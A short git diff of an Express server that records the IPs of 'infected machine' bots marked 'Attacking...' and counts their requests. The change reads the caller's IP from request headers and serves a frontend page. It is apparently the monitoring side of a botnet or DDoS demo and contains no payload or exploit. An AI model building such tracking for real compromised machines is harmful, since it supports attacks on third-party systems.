@@ -38,24 +38,30 @@ const incrementCounter = (ip) => {
   });
 };
 
-app.get("/:ip", (req, res) => {
-  if (req.params.ip) {
-    if (!exists(req.params.ip)) {
+app.get("/", (req, res) => {
+  var ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || null;
+  //if (req.params.ip) {
+  //if (!exists(req.params.ip)) {
+  if (ip) {
+    if (!exists(ip)) {
       bots.push({
         id: bots.length + 1,
-        ip: req.params.ip,
+        ip: ip,
         nRequest: 0,
         status: "Attacking...",
       });
     }
-    incrementCounter(req.params.ip);
+    //incrementCounter(req.params.ip);
+    incrementCounter(ip);
   } else {
-    res.status(400).json({ message: "Include ip address of infected machine" });
+    //res.status(400).json({ message: "Include ip address of infected machine" });
+    res.sendFile(path.resolve(__dirname, "frontend", "build", "index.html"));
     return;
   }
 
   numberOfRequests += 1;
-  res.status(200).json({ msg: "Updated counter" });
+  //res.status(200).json({ msg: "Updated counter" });
+  res.sendFile(path.resolve(__dirname, "frontend", "build", "index.html"));
 });
 
 const CHECK_STATUS_EVENT = "checkStatusEvent";
